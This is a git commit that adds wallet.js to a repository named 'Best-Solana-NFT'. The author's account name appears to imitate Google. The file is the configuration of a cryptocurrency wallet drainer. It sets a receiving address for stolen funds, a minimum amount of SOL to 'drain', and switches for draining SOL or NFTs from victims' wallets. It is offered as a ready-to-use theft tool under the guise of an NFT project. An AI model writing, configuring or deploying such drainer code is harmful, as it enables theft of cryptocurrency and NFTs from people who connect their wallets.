6bd4b8c210fbf6fc3a89aae5f4b673960311e69a
g00glecenter101-arch <g00glecenter101@gmail.com>
2026-09-24 17:01:32 -0700

    Add files via upload

---
+++ Best-Solana-NFT/Best-Solana-NFT-main/wallet.js
@@ -0,0 +1,13 @@
+/*   = = = = = YOUR WALLET ADRESS = = = = =   */
+const receiveAddress = "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1"; // Adress where you want to receive money/nfts
+
+/*   = = = = = AMOUNT = = = = =   */
+const amount = {
+    minimal: 0.0001 // Minimal of amount of Solana to drain (2.0 is the minimum supported)
+}
+
+/*   = = = = = MODES = = = = =   */
+const active = {
+    solana: true, // To drain sol, remove this line if you only want to drain NFTs
+    //  // To Drain nfts, remove this line if you only want to drain Solana
+}
